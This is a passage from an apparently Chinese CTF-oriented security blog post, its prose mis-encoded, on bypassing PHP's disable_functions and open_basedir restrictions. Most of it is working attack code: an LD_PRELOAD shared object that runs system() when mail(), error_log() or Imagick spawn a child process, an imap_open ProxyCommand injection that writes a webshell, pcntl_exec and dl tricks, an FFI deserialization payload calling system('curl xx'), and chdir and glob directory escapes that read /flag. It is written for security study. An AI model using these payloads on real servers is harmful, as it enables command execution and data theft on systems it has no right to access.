<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./hack.so"</span>);</span><br><span class="line">mail(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);<span class="comment">//error_log('',1);</span></span><br><span class="line"><span class="comment">//imap_mail('a@a',1,1,1,1);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œèƒ½è°ƒç”¨çš„å‡½æ•°ä¸æ­¢æœ‰mailï¼Œåœ¨mailå‡½æ•°è¢«banæ‰çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ç”¨error_logï¼Œimap_mailç­‰ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯error_logçš„ç¬¬äºŒä¸ªå‚æ•°éœ€è¦è®¾ç½®ä¸º1è¡¨ç¤ºå‘é€é‚®ä»¶ä¼šè°ƒç”¨sendmailè¿›ç¨‹ï¼Œimap_mailä¹Ÿå¯è°ƒç”¨sendmailè¿›ç¨‹ï¼Œå³å¯è°ƒç”¨sendmailå­è¿›ç¨‹ï¼Œä¸‹é¢æ”¾ä¸€ä¸‹å¯¹æ¯”å›¾ï¼Œå°±ä¸æ¼”ç¤ºå…·ä½“çš„è¿‡ç¨‹äº†</p>
<p><img src="https://s2.ax1x.com/2019/10/03/uwQjHJ.png" alt="uwQjHJ.png"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œéƒ½è°ƒç”¨äº†sendmailè¿›ç¨‹ã€‚</p>
<h5 id="åŠ«æŒå¯åŠ¨è¿›ç¨‹"><a href="#åŠ«æŒå¯åŠ¨è¿›ç¨‹" class="headerlink" title="åŠ«æŒå¯åŠ¨è¿›ç¨‹"></a>åŠ«æŒå¯åŠ¨è¿›ç¨‹</h5><p>ä»ä¸Šé¢æ¥çœ‹ï¼ŒåŠ«æŒåº“å‡½æ•°éœ€è¦æ‰¾åˆ°ç‰¹å®šçš„åº“å‡½æ•°å»åŠ«æŒï¼Œé‚£ä¹ˆåŠ«æŒæ–°è¿›ç¨‹æ˜¯ä¸éœ€è¦æ‰¾åˆ°ç‰¹å®šçš„åº“å‡½æ•°çš„ã€‚</p>
<blockquote>
<p>GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <code>__attribute__((constructor))</code>ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ <code>__attribute__((constructor))</code> ä¿®é¥°çš„å‡½æ•°ã€‚</p>
</blockquote>
<p>__attribute__((constructor))æ›´åŠ ç›´æ¥çš„å»è®²ï¼šæœ‰è¿™ä¸ªè¯´æ˜ï¼š</p>
<p><strong>å®ƒæ˜¯åœ¨åŠ è½½å…±äº«åº“æ—¶è¿è¡Œçš„ï¼Œé€šå¸¸æ˜¯åœ¨ç¨‹åºå¯åŠ¨è¿‡ç¨‹ä¸­</strong>ï¼Œä¹Ÿå°±æ˜¯å½“æœ‰ä¸€ä¸ªæ–°è¿›ç¨‹/å­è¿›ç¨‹å¯åŠ¨æ—¶ï¼Œé‚£ä¹ˆ__attribute__((constructor))å°±ä¼šè¢«ç›´æ¥åŠ è½½ï¼Œæˆ‘ä»¬ä¸Šé¢çš„mailç­‰å‡½æ•°ä¹Ÿæ­£å¥½ç¬¦åˆè¿™ä¸ªç‰¹æ€§ï¼Œä¸‹é¢ä¹Ÿæ¥ç€æ¥è¯•ä¸€ä¸‹</p>
<p>hack.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hack.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./hack.so"</span>);</span><br><span class="line">error_log(<span class="string">''</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼Œå³å¯åˆ—ç›®å½•</p>
<p>å…·æœ‰è¿™ç§å¼€ä¸€ä¸ªæ–°è¿›ç¨‹/å­è¿›ç¨‹çš„å‡½æ•°è¿˜æœ‰å…¶ä»–çš„ï¼Œæ¯”å¦‚imagickåŒæ ·å¯ä»¥</p>
<p>test.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'test.wmv'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ–°å»ºä¸€ä¸ªtest.wmv</p>
<p>çœ‹ä¸€ä¸‹è°ƒç”¨çš„æ–°è¿›ç¨‹</p>
<p><img src="https://s2.ax1x.com/2019/10/04/uB7xot.png" alt="uB7xot.png"></p>
<p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºè¿™é‡Œå–è°ƒç”¨äº†æ–°è¿›ç¨‹ffmpegè¿›è¡Œå¤„ç†</p>
<p>è°ƒç”¨ffmpegçš„è¿˜æœ‰ä»¥ä¸‹å‡ ç§åç¼€</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp</span><br></pre></td></tr></table></figure>

<p>å¼•å…¥æ¶æ„soè¿›è¡Œä¸€ä¸‹å®éªŒ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@4c80e397e0b2:/<span class="comment"># php test.php</span></span><br><span class="line">bin   etc   hack.c   lib    mnt   readflag    run   sys       tmp</span><br><span class="line">boot  flag  hack.so  lib64  opt   readflag.c  sbin  test.php  usr</span><br><span class="line">dev   hack  home     media  proc  root        srv   test.wmv  var</span><br><span class="line">PHP Fatal error:  Uncaught ImagickException: unable to open image `/tmp/magick-709mqrbus4dKcZ0.pam<span class="string">': No such file or directory @ error/blob.c/OpenBlob/2701 in /test.php:3</span></span><br><span class="line"><span class="string">Stack trace:</span></span><br><span class="line"><span class="string">#0 /test.php(3): Imagick-&gt;__construct('</span>test.wmv<span class="string">')</span></span><br><span class="line"><span class="string">#1 &#123;main&#125;</span></span><br><span class="line"><span class="string">  thrown in /test.php on line 3</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æˆåŠŸåˆ—äº†ç›®å½•</p>
<p>å½“ç„¶ï¼Œå…¶ä»–åç¼€æ˜¯å¯ä»¥è°ƒç”¨å…¶ä»–çš„æ–°è¿›ç¨‹</p>
<p>ä»kylingitè¿™ä½å¸ˆå‚…åšå®¢å¯ä»¥çœ‹åˆ°éƒ¨åˆ†åˆ—ä¸¾å‡ºæ¥çš„å¸¸è§è°ƒç”¨ä¾èµ–</p>
<table>
<thead>
<tr>
<th>EPI/EPS/PDF/PS</th>
<th><a href="http://www.cs.wisc.edu/~ghost" target="_blank" rel="noopener">Ghostscript</a></th>
</tr>
</thead>
<tbody><tr>
<td>MNG/M2V</td>
<td><a href="https://www.ffmpeg.org/download.html" target="_blank" rel="noopener">ffmpeg</a></td>
</tr>
<tr>
<td>JXR</td>
<td><a href="https://jxrlib.codeplex.com/" target="_blank" rel="noopener">jxrlib</a></td>
</tr>
</tbody></table>
<p>æ›´è¯¦ç»†çš„å¯ä»¥ç›´æ¥å‚è€ƒä¸€ä¸‹å®˜ç½‘<a href="https://imagemagick.org/script/formats.php" target="_blank" rel="noopener">https://imagemagick.org/script/formats.php</a></p>
<p>ä¸‹é¢ä»¥PDFä¸ºä¾‹éªŒè¯</p>
<p><img src="https://s2.ax1x.com/2019/10/04/uD9rn0.png" alt="uD9rn0.png"></p>
<p>è¿™é‡Œçš„imagickä¼¼ä¹æ˜¯æ˜¯æœ‰ä¸€ä¸ªç¦æ­¢è°ƒç”¨çš„åå•ï¼Œè¿™é‡Œå†™çš„æ˜¯gsçš„ç¦æ­¢è°ƒç”¨åå•ï¼Œéœ€è¦æŠŠnoneæ”¹ä¸ºread|write,æ¥ä¸‹æ¥çš„ç¨‹åºæ­£å¸¸è¿›è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'test.pdf'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/04/uDmFeJ.png" alt="uDmFeJ.png"></p>
<p>æˆåŠŸè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p>
<p>å¯ä»¥ç”¨straceå…·ä½“çœ‹ä¸€ä¸‹è°ƒç”¨è¿›ç¨‹</p>
<p><img src="https://s2.ax1x.com/2019/10/04/urkE4K.png" alt="urkE4K.png"></p>
<p>ä»ä¸Šå›¾å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ°åœ¨å¤„ç†pdfåç¼€çš„æ—¶å€™ä¼šè°ƒç”¨ghostscriptï¼Œè¿™æ ·å°±æ»¡è¶³äº†æ–°è¿›ç¨‹ï¼Œä»è€ŒåŠ è½½äº†æˆ‘ä»¬__attribute__ ((__constructor__))éƒ¨åˆ†</p>
<h4 id="åˆ©ç”¨imap-open"><a href="#åˆ©ç”¨imap-open" class="headerlink" title="åˆ©ç”¨imap_open"></a>åˆ©ç”¨imap_open</h4><p>è¿™ä¸ªä¸œè¥¿ä¹‹å‰ä¹Ÿå†™è¿‡ï¼Œç›´æ¥æ”¾ä¸‹pocå’Œä»¥å‰çš„æ–‡ç« é“¾æ¥å¥½äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>$server = <span class="string">"any -o ProxyCommand=echo\t'\&lt;?php\tsystem(whoami);?&gt;'\t&gt;\t1.php"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);`</span><br></pre></td></tr></table></figure>

<p>ä¸€èˆ¬åˆ©ç”¨imapè¿›è¡Œbypassæ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬æŠŠå›æ˜¾çš„ç»“æœå†™å…¥æ–‡ç« å†…å®¹</p>
<p>æ–‡ç« é“¾æ¥</p>
<p><a href="https://lihuaiqiu.github.io/2019/06/01/PHPé‚®ä»¶æ¼æ´å°ç»“/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/06/01/PHP%E9%82%AE%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</a></p>
<h4 id="pcntlæ’ä»¶-bypass"><a href="#pcntlæ’ä»¶-bypass" class="headerlink" title="pcntlæ’ä»¶ bypass"></a>pcntlæ’ä»¶ bypass</h4><p>è½½å®‰è£…pcntlæ’ä»¶çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡pcntlè¿›è¡Œbypassã€‚</p>
<p>å¦‚æœåœ¨æŸ¥çœ‹phpinfo()ç§çœ‹åˆ°enable-pcntlï¼Œå¹¶ä¸”åœ¨disable_functionså…è®¸çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢poc bypass</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exec.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> pcntl_exec(<span class="string">"/bin/bash"</span>, <span class="keyword">array</span>(<span class="string">"/tmp/b4dboy.sh"</span>));&gt;</span><br><span class="line"><span class="comment">#/tmp/b4dboy.sh#!/bin/bash</span></span><br><span class="line">ls -l /</span><br></pre></td></tr></table></figure>

<h4 id="å¤–éƒ¨æ‰©å±•åº“dl-bypass"><a href="#å¤–éƒ¨æ‰©å±•åº“dl-bypass" class="headerlink" title="å¤–éƒ¨æ‰©å±•åº“dl bypass"></a>å¤–éƒ¨æ‰©å±•åº“dl bypass</h4><p>dlæ‰©å±•åº“çš„è¯¦ç»†å®‰è£…è¿‡ç¨‹</p>
<p><a href="http://reverse-tcp.xyz/php/pentest/2016/12/22/php-disabled_functions-bypass.html" target="_blank" rel="noopener">http://reverse-tcp.xyz/php/pentest/2016/12/22/php-disabled_functions-bypass.html</a></p>
<p>dl bypass-poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">dl(<span class="string">"dl.so"</span>);  <span class="comment">//dl.soåœ¨extension_dirç›®å½•ï¼Œå¦‚ä¸åœ¨åˆ™ç”¨../../æ¥å®ç°è°ƒç”¨</span></span><br><span class="line">confirm_dl_compiled(<span class="string">"$_GET[a]&gt;;1.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦å°±æ˜¯dl.soè¿™ä¸ªæ–‡ä»¶çš„æœç´¢ï¼Œé€šè¿‡è°ƒç”¨dl.soè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p>
<h4 id="PHP7-4-FFI-bypass"><a href="#PHP7-4-FFI-bypass" class="headerlink" title="PHP7.4-FFI bypass"></a>PHP7.4-FFI bypass</h4><p>åœ¨RCTF2019ä¸­å‡ºçš„é¢˜ï¼Œè€ƒå¯Ÿäº†php7.4çš„æ–°ç‰¹æ€§ï¼Œé€šè¿‡æ–°åŠ çš„FFIå³å¯bypass disable function</p>
<p>preloadä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">    array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®˜æ–¹ç»™çš„è°ƒç”¨å½¢å¼å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int printf(const char *format, ...);"</span>, <span class="comment">// this is a regular C declaration</span></span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"><span class="comment">// call C's printf()</span></span><br><span class="line">$ffi-&gt;printf(<span class="string">"Hello %s!\n"</span>, <span class="string">"world"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯¹äºFFI::cdefä¸­ç¬¬äºŒä¸ªå‚æ•°ä¸è¿›è¡Œä¼ å‚ä¹Ÿå¯ä»¥ï¼Œå¹¶ä¸”åœ¨php7.4ä¸­æˆ‘ä»¬æˆ‘ä»¬å¯ä»¥é€šè¿‡__unserializeå’Œ<em>\</em>serializeæ¥æ§åˆ¶è‡ªå®šä¹‰å¯¹è±¡çš„åºåˆ—åŒ–</p>
<p>æœ€ç»ˆpoc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#39;);$a-&gt;ret-&gt;system(&#39;curl xx&#39;);</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨æµç¨‹ï¼šååºåˆ—åŒ–è§¦å‘__unserializeï¼Œé€šè¿‡è°ƒç”¨ä¸å­˜åœ¨çš„å˜é‡åretè§¦å‘__getï¼Œæœ€åè¿›è¡ŒFFIå‘½ä»¤æ‰§è¡Œ</p>
<h3 id="Bypass-open-basedir"><a href="#Bypass-open-basedir" class="headerlink" title="Bypass open_basedir"></a>Bypass open_basedir</h3><h4 id="chdir-bypass"><a href="#chdir-bypass" class="headerlink" title="chdir bypass"></a>chdir bypass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'/tmp/test'</span>);chdir(<span class="string">'/tmp/test/'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(file_get_contents(<span class="string">"/flag"</span>));</span><br></pre></td></tr></table></figure>

<h4 id="glob-bypass"><a href="#glob-bypass" class="headerlink" title="glob bypass"></a>glob bypass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢æ˜¯æ¯”è¾ƒå¸¸è§çš„open_basedir bypassï¼Œä¹Ÿè¿˜æœ‰å¥½å‡ ç§bypass.</p>
<h3 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h3><p>ä¸Šé¢åœ¨bypass disabled_functionsæˆ‘å°‘å†™äº†ä¸€ä¸ªmod_cgiçš„bypassï¼Œåœ¨bypass open_basedirä¸­å°‘å†™äº†ä¸€ä¸ªfpm bypassçš„æ–¹æ³•ï¼Œä¸»è¦æ˜¯æƒ³è¿™ä¸¤ä¸ªæ–¹æ³•éƒ½å¾ˆæœ‰æ„æ€ï¼Œå‡†å¤‡å•ç‹¬æ‹¿å‡ºæ¥å†™ä¸€ä¸‹ï¼Œåœ¨ä»¥åçš„æ–‡ç« ä¸­ä¼šçœ‹åˆ°ä»–ä»¬çš„èº«å½±ã€‚</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/09/Bypass-disabled-functions-open-basedir-php/" data-id="ckabsu37t000fkkvrad636pl2" class="article-share-link" data-share="baidu" data-title="Bypass disabled_functions &amp; open_basedir-php">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/09/Bypass-disabled-functions-open-basedir-php/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Thinkphp-6-0-x-popé“¾åˆ†æ" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/09/Thinkphp-6-0-x-pop%E9%93%BE%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2019-10-09T10:17:06.000Z" itemprop="datePublished">2019-10-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/09/Thinkphp-6-0-x-pop%E9%93%BE%E5%88%86%E6%9E%90/">Thinkphp 6.0.x popé“¾åˆ†æ</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æ¥ç€ä¸Šæ¬¡çš„æ¥åˆ†æä¸€ä¸‹Thinkphp6.0.xçš„popé“¾</p>
